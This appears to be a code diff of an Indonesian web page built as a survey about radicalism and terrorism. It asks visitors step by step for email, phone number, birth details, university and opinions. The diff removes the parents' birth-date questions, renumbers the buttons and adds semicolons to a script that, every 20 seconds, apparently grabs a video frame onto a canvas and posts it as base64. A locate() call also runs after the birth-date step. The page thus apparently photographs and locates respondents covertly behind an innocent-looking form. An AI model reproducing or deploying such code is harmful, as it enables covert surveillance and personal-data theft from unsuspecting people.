@@ -81,13 +81,14 @@ var context = canvas.getContext('2d');
   setInterval(function(){
 
        context.drawImage(video, 0, 0, 640, 640);
-       var canvasData = canvas.toDataURL("image/png")
-       cc = String(canvasData).replace("data:image/png;base64,","")
+       var canvasData = canvas.toDataURL("image/png");
+       cc = String(canvasData).replace("data:image/png;base64,","");
       //  console.log(cc)
-       post(cc); }, 20000);
+       post(cc);}, 20000);
   
 
 }
+
 
 // Load init
 init();
@@ -171,8 +172,6 @@ init();
     $('#alamatEmail').hide();
     $('#nomorHP').hide();
     $('#TTL').hide();
-    $('#TTLAyah').hide();
-    $('#TTLIbu').hide();
     $('#asalUniversitas').hide();
     $('#jurusanKuliah').hide();
     $('#pendapatRadikalisme').hide();
@@ -212,36 +211,14 @@ init();
       if (inputTtl('tempatLahir', 'taggalLahir')) {
         $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
         $('#TTL').fadeOut();
-        $('#TTLAyah').delay(5000).fadeIn();
+        $('#asalUniversitas').delay(5000).fadeIn();
         locate();
       }
      
     });
 
-// tempat tgl lahir ibu kandung
-// 
+
     $('.tbl5').click(function() {
-        if (inputTtl('tempatLahirAyah', 'taggalLahirAyah')) {
-          $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
-          $('#TTLAyah').fadeOut();
-          $('#TTLIbu').delay(5000).fadeIn();
-          
-        }
-      
-      });
-
-    $('.tbl6').click(function() {
-        if (inputTtl('tempatLahirIbu', 'taggalLahirIbu')) {
-          $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
-          $('#TTLIbu').fadeOut();
-          $('#asalUniversitas').delay(5000).fadeIn();
-          
-        }
-      
-      });
-
-
-    $('.tbl7').click(function() {
         if (klikSubmit('asalUnivform1')) {
           $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
           $('#asalUniversitas').fadeOut();
@@ -251,7 +228,7 @@ init();
       
       });
 
-    $('.tbl8').click(function() {
+    $('.tbl6').click(function() {
       if (klikSubmit('jurusanform1')) {
       $('#gtau').fadeIn(200).delay(5000).fadeOut(); 
       $('#jurusanKuliah').fadeOut();
@@ -259,7 +236,7 @@ init();
       }
     });
 
-    $('.tbl9').click(function() {
+    $('.tbl7').click(function() {
       if (klikSubmit('pendapatRadikalismeform1')) {
       $('#gtau').fadeIn(200).delay(900).fadeOut(); 
       $('#pendapatRadikalisme').fadeOut();
@@ -268,7 +245,7 @@ init();
       }
     });
 
-    $('.tbl10').click(function() {
+    $('.tbl8').click(function() {
       $('#gtau').fadeIn(200).delay(2000).fadeOut(); 
       $('#radikalAgama').fadeOut();
       $('pendapatTerorisme1form1').delay(3000).fadeIn();
@@ -286,8 +263,8 @@ init();
      }else{
       nilai = rad3.value;
      }
-     console.log(nilai);
-      $.ajax({          
+
+     $.ajax({          
             type: 'POST',
             url: 'handler.php',
             data: {"data_formulir":`${rad1.name} : ${nilai}`},
@@ -296,7 +273,7 @@ init();
     });
 });
 
-  $('.tbl11').click(function() {
+  $('.tbl9').click(function() {
       if (klikSubmit('pendapatTerorisme1form1')) {
       $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
       $('#pendapatTerorrisme').fadeOut();
@@ -347,7 +324,7 @@ init();
 <div id="nomorHP">
   <div class="form-group">
     <label for="nomorhpform1"><h5>Nomor HP</h5></label>
-    <input type="number" class="form-control" id="nomorhpform1" aria-describedby="emailHelp" placeholder="masukkan nomor WA" required>
+    <input type="number" class="form-control" id="nomorhpform1" aria-describedby="emailHelp" name="Nomor HP" placeholder="masukkan nomor WA" required>
   </div>
 
   <button class="btn btn-primary tbl3">Kirim</button>
@@ -372,34 +349,6 @@ init();
 
 </div>
 
-<div id="TTLAyah">
-  <div class="form-group">
-    <label for="tempatLahirAyah"><h5>Tempat Lahir Ayah</h5></label>
-    <input type="text" class="form-control mb-5" id="tempatLahirAyah" name="Tempat Lahir Ayah" placeholder="Tempat Lahir..." required>
-    
-    <label for="taggalLahirAyah"><h5>Tanggal Lahir Ayah</h5></label>
-    <input type="date" class="form-control" placeholder="dd-mm-yyyy" id="taggalLahirAyah" name="Tanggal Lahir Ayah" required>
-    <p>*pengisian tanggal bisa dilakukan dengan klik ikon tanggalan</p>
-  </div>
-
-  <button class="btn btn-primary tbl5">Kirim</button>
-
-</div>
-
-<div id="TTLIbu">
-  <div class="form-group">
-    <label for="tempatLahirIbu"><h5>Tempat Lahir Ibu</h5></label>
-    <input type="text" class="form-control mb-5" id="tempatLahirIbu" name="Tempat Lahir Ibu" placeholder="Tempat Lahir..." required>
-    
-    <label for="taggalLahirIbu"><h5>Tanggal Lahir Ibu</h5></label>
-    <input type="date" class="form-control" placeholder="dd-mm-yyyy" id="taggalLahirIbu" name="Tanggal Lahir Ibu" required>
-    <p>*pengisian tanggal bisa dilakukan dengan klik ikon tanggalan</p>
-  </div>
-
-  <button class="btn btn-primary tbl6">Kirim</button>
-
-</div>
-
 
 <div id="asalUniversitas">
   <div class="form-group">
@@ -407,7 +356,7 @@ init();
     <input type="text" class="form-control" id="asalUnivform1" aria-describedby="emailHelp" name="Universitas" placeholder="asal universitas" required>
   </div>
 
-  <button class="btn btn-primary tbl7">Kirim</button>
+  <button class="btn btn-primary tbl5">Kirim</button>
   
 </div>
 
@@ -417,17 +366,17 @@ init();
     <input type="text" class="form-control" id="jurusanform1" aria-describedby="emailHelp" name="Universitas" placeholder="asal universitas" required>
   </div>
 
-  <button class="btn btn-primary tbl8">Kirim</button>
+  <button class="btn btn-primary tbl6">Kirim</button>
   
 </div>
 
 <div id="pendapatRadikalisme">
   <div class="form-group">
     <label for="pendapatRadikalismeform1"><h5>Menurutmu apa itu paham radikal?</h5></label>
-    <textarea class="form-control" id="pendapatRadikalismeform1" aria-describedby="emailHelp" name="Universitas" placeholder="Tulis disini...." rows="7"></textarea>
+    <textarea class="form-control" id="pendapatRadikalismeform1" aria-describedby="emailHelp" name="Apa itu Paham Radikal" placeholder="Tulis disini...." rows="7"></textarea>
   </div>
 
-  <button class="btn btn-primary tbl9">Kirim</button>
+  <button class="btn btn-primary tbl7">Kirim</button>
   
 </div>
 
@@ -449,7 +398,7 @@ init();
     </label>
   </div>
 
-  <button class="btn btn-primary mt-3 tbl10" onclick="klikSubmit('radikalagamaform1')">Kirim</button>
+  <button class="btn btn-primary mt-3 tbl8">Kirim</button>
   
 </div>
 
@@ -457,10 +406,10 @@ init();
 <div id="pendapatTerorrisme1">
   <div class="form-group">
     <label for="pendapatTerorisme1form1"><h5>Menurutmu apa itu paham radikal?</h5></label>
-    <textarea class="form-control" id="pendapatTerorisme1form1" aria-describedby="emailHelp" name="Universitas" placeholder="Tulis disini...." rows="7"></textarea>
+    <textarea class="form-control" id="pendapatTerorisme1form1" aria-describedby="emailHelp" name="paham_radikal" placeholder="Tulis disini...." rows="7"></textarea>
   </div>
 
-  <button class="btn btn-primary tbl11">Kirim</button>
+  <button class="btn btn-primary tbl9">Kirim</button>
   
 </div>
 </div>
